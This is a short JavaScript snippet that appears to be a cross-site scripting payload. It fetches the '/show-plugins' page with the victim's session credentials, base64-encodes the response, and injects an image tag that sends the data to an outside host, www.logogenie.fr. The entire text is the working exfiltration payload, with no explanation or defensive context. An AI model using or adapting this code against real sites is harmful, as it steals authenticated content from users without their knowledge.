async function fetchData(url) {
    const response = await fetch(url, { credentials: 'include' });
    const data = await response.text();
    console.log(data);
    var i1 = '<img src="https://www.logogenie.fr/data?data=' + btoa(data) + '" />'
    document.body.innerHTML += i1

}
fetchData('/show-plugins');
